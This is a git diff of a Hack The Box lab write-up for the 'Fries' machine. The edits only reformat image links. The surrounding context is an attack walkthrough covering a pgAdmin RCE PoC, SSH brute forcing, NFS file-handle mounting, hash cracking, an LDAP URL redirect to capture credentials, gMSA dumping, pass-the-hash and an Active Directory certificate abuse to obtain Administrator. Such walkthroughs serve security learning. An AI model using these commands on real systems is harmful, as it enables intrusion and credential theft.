@@ -287,7 +287,7 @@ Host script results:
 - Dual layer..Target is fries.htb with DC dc01.fries.htb and a linux frontend with port 22 and 80 open.
 
 ### port 80
-![[Pasted image 20260403033845.png]]
+![Pasted image 20260403033845](../Attachments/Pasted20image%2020260403033845.png)
 
 ### Ffuf
 - ffuf reveals another sublink:
@@ -322,11 +322,11 @@ code                    [Status: 200, Size: 13593, Words: 1048, Lines: 272, Dura
 
 - I add to `/etc/hosts`
 - Leads to a Gitea page:
-![[Pasted image 20260403034251.png]]
+![Pasted image 20260403034251](../Attachments/Pasted20image%2020260403034251.png)
 - Users dale and admin exist here.
 - Using the given credentials we can log in : `d.cooper@fries.htb`:`D4LE11maan!!`
 - This reveals a repo:
-![[Pasted image 20260403034800.png]]
+![Pasted image 20260403034800](../Attachments/Pasted20image%2020260403034800.png)
 - Looking at the commits I find some information:
 	- Another subdomain : `db-mgmt05.fries.htb`
 	- DB name (PostgreSQL): `ps_db`
@@ -336,33 +336,33 @@ code                    [Status: 200, Size: 13593, Words: 1048, Lines: 272, Dura
 
 - Looking back at nmap scan I also see other subdomains : `pwm.fries.htb`. Not really sure if needed to add in /etc/hsots but even without can access via https url to fries.htb with email web@fries.htb:
 - This leads to a Password Manager:
-![[Pasted image 20260403041601.png]]
+![Pasted image 20260403041601](../Attachments/Pasted20image%2020260403041601.png)
 
 - I try d.coopers credentials but it fails with an interesting error talking of user `svc_infra`
-![[Pasted image 20260403041547.png]]
+![Pasted image 20260403041547](../Attachments/Pasted20image%2020260403041547.png)
 
 - Theres also a crednetial manager button which leads here: `https://fries.htb/pwm/private/config/login`
-![[Pasted image 20260403041703.png]]
+![Pasted image 20260403041703](../Attachments/Pasted20image%2020260403041703.png)
 
 - Going back to what we found in Gitea the newly found subdomain leads to a new login page:
-![[Pasted image 20260403042915.png]]
+![Pasted image 20260403042915](../Attachments/Pasted20image%2020260403042915.png)
 
  - `d.cooper`'s credentials work here too:
-![[Pasted image 20260403043139.png]]
+![Pasted image 20260403043139](../Attachments/Pasted20image%2020260403043139.png)
 
 - I am then prompted by the psql password when selecting the db on the left:
-![[Pasted image 20260403044419.png]]
-![[Pasted image 20260403044450.png]]
+![Pasted image 20260403044419](../Attachments/Pasted20image%2020260403044419.png)
+![Pasted image 20260403044450](../Attachments/Pasted20image%2020260403044450.png)
 
 - I find some hashes under `gitea/public/tables/user` (right click > scripts > inset select and run)
-![[Pasted image 20260403045048.png]]
+![Pasted image 20260403045048](../Attachments/Pasted20image%2020260403045048.png)
 
 - Hashes :
 	- `administrator`:`67faad48c47a340b45ca87fa1dc4d048ce6b41bb6fae6b555240f1ffdc31367ddb8430a46811a7d402618aec8cce4f00143e`
 	- `dale`:`8ba77f28df211ea62db7fbecbfb595cd0568f9e34e0832ae87dfa45154f592eff45453041f1c1b7cc46dc62b94cb70abc67e`
 
 - I also check version of pgAdmin 4 :`9.1`
-![[Pasted image 20260403045537.png]]
+![Pasted image 20260403045537](../Attachments/Pasted20image%2020260403045537.png)
 
 - leads me to a PoC for a CVE: https://github.com/abrewer251/CVE-2025-2945_PgAdmin_PoC](https://github.com/ExtremeUday/CVE-2025-2945-pgAdmin4-Authenticated-RCE-PoC-/blob/main/poc.py)
 
@@ -380,10 +380,10 @@ python3 exp3.py --target-url http://db-mgmt05.fries.htb --username 'd.cooper@fri
 
 ```
 
-![[Pasted image 20260403051331.png]]
+![Pasted image 20260403051331](../Attachments/Pasted20image%2020260403051331.png)
 
 - Checking `env` varibales I find some credentials:
-![[Pasted image 20260403051446.png]]
+![Pasted image 20260403051446](../Attachments/Pasted20image%2020260403051446.png)
 
 ```
 env
@@ -425,7 +425,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-04-03 05:25:
 [22][ssh] host: 10.129.244.72   login: svc   password: Friesf00Ds2025!!
 ^CThe session file ./hydra.restore was written. Type "hydra -R" to resume session
 ```
-![[Pasted image 20260403055643.png]]
+![Pasted image 20260403055643](../Attachments/Pasted20image%2020260403055643.png)
 - I login to target with the credentials `svc`:`Friesf00Ds2025!!`
 ```
 ssh svc@fries.htb
@@ -445,7 +445,7 @@ Export list for 192.168.100.2:
 ```
 
 - I check the path to find some files:
-![[Pasted image 20260403054237.png]]
+![Pasted image 20260403054237](../Attachments/Pasted20image%2020260403054237.png)
 
 - As a lot of ports are open internally I use a ligolo tunnel to them be able to analyse the nfs share
 ```
@@ -547,7 +547,7 @@ sssd:*:20238:0:99999:7:::
 ```
 
 - We get the Root File handle value:
-![[Pasted image 20260403064229.png]]
+![Pasted image 20260403064229](../Attachments/Pasted20image%2020260403064229.png)
 
 Can now use (new tool) called  `fuse_nfs` : https://github.com/sahlberg/fuse-nfs
 
@@ -557,12 +557,12 @@ fuse_nfs /home/kali/Documents/HTB/Active/Fries/docker1 240.0.0.1 --manual-fh "01
 - Make sure you create the folder `docker1` in the path
 
 - Then you can access the path to see the contents:
-![[Pasted image 20260403072120.png]]
+![Pasted image 20260403072120](../Attachments/Pasted20image%2020260403072120.png)
 - I can access `/srv/web.fries.htb/certs` now and find some certificates
-![[Pasted image 20260403072710.png]]
+![Pasted image 20260403072710](../Attachments/Pasted20image%2020260403072710.png)
 - I recognized it was a docker container (if you didnt already know) via checking the interfaces open and it pointing to a lot.
 - I access the docker policy file at `/var/lib/authz-broker/policy.json`:
-![[Pasted image 20260403072928.png]]
+![Pasted image 20260403072928](../Attachments/Pasted20image%2020260403072928.png)
 ```
 cat policy.json
 
@@ -609,7 +609,7 @@ root@f427ecaa3bdd:/#
 ```
 
 - From here I notice a config folder in / directory. I access it to find the PWM config file `PwmConfiguration.xml` where I find a hash:
-![[Pasted image 20260403080944.png]]
+![Pasted image 20260403080944](../Attachments/Pasted20image%2020260403080944.png)
 - I crack it with john to get the password `rockon!`
 ```
 john hash --wordlist=/usr/share/wordlist/rockyou.txt
@@ -617,7 +617,7 @@ john hash --wordlist=/usr/share/wordlist/rockyou.txt
 ---OUTPUT---
 rockon!          (?)    
 ```
-![[Pasted image 20260403081103.png]]
+![Pasted image 20260403081103](../Attachments/Pasted20image%2020260403081103.png)
 
 - I can then logon to Configuration Editor on the PWM site. Here I find the link to LDAP and see that I can modify it. I turn on a listener and wirehsark and then enter my IP in the LDAP url:
 ```
@@ -627,15 +627,15 @@ wireshark
 ```
 
 - I change the LDAP Url:
-![[Pasted image 20260403081322.png]]
+![Pasted image 20260403081322](../Attachments/Pasted20image%2020260403081322.png)
 
 - Then find the credential on wireshark (the netcat output isnt fully readable so fails)
-![[Pasted image 20260403081342.png]]
+![Pasted image 20260403081342](../Attachments/Pasted20image%2020260403081342.png)
 
-![[Pasted image 20260403081354.png]]
+![Pasted image 20260403081354](../Attachments/Pasted20image%2020260403081354.png)
 
 - This might be `svc_infra`'s creds as it was failing to authenticate earlier when we tried to log in to the site:
-![[Pasted image 20260403081819.png]]
+![Pasted image 20260403081819](../Attachments/Pasted20image%2020260403081819.png)
 
 - However n o log in from winrm or rdp.
 ### BloodHund:
@@ -645,7 +645,7 @@ bloodhound-python -c all -u 'svc_infra' -p 'm6tneOMAh5p0wQ0d' -ns 10.129.244.72 
 ```
 
 - Looking at `svc_infra` I see we can read GSMA pwd for  GSMA_CA_PROD
-![[Pasted image 20260403082617.png]]
+![Pasted image 20260403082617](../Attachments/Pasted20image%2020260403082617.png)
 
 
 - Using this tool I can read the password: https://github.com/micahvandeusen/gMSADumper
@@ -671,12 +671,12 @@ LDAP        dc01.fries.htb  389    DC01             Account: gMSA_CA_prod$      
 ```
 
 - Looking at the gmsa suer we see it is part of remote management users and so we can winrm to the machine:
-![[Pasted image 20260403083313.png]]
+![Pasted image 20260403083313](../Attachments/Pasted20image%2020260403083313.png)
 
 ```
 evil-winrm -i dc01.fries.htb -u 'GMSA_CA_PROD$' -H '27e126bdd4ae61c18377c4f8dd42fa86'
 ```
-![[Pasted image 20260403084457.png]]
+![Pasted image 20260403084457](../Attachments/Pasted20image%2020260403084457.png)
 
 - Using `Certify` we find CA vulenrabilities : https://github.com/GhostPack/Certify (compiled in visual studio and Debug folder sent to target)
 ```
@@ -801,7 +801,7 @@ Start-Service certsvc
 
 - Initially using `gMSA_CA_prod$` I find that it did not have permissions to request `User` certificate template. I then tried the same command with `svc_infra` which worked:
 	- Note to get the ISD we know it ends with 500 for Admin and we can use the remaining format by checking `whoami /user` on `sql-infra` terminal:
-![[Pasted image 20260403093909.png]]
+![Pasted image 20260403093909](../Attachments/Pasted20image%2020260403093909.png)
 ```
 certipy-ad req -u svc_infra@fries.htb -p "m6tneOMAh5p0wQ0d" -target dc01.fries.htb -dc-ip 10.129.19.98 -ca fries-DC01-CA -template User -upn Administrator@fries.htb -sid "S-1-5-21-858338346-3861030516-3975240472-500" -subject "CN=Administrator,CN=Users,DC=fries,DC=htb" -dcom
 Certipy v5.0.4 - by Oliver Lyak (ly4k)
@@ -836,7 +836,7 @@ Certipy v5.0.4 - by Oliver Lyak (ly4k)
 ```
 evil-winrm -i dc01.fries.htb -u 'Administrator' -H 'a773cb05d79273299a684a23ede56748'
 ```
-![[Pasted image 20260403093711.png]]
+![Pasted image 20260403093711](../Attachments/Pasted20image%2020260403093711.png)
 
 - I grab the root and user flag in Administrtor's Desktop:
-![[Pasted image 20260403093749.png]]
+![Pasted image 20260403093749](../Attachments/Pasted20image%2020260403093749.png)
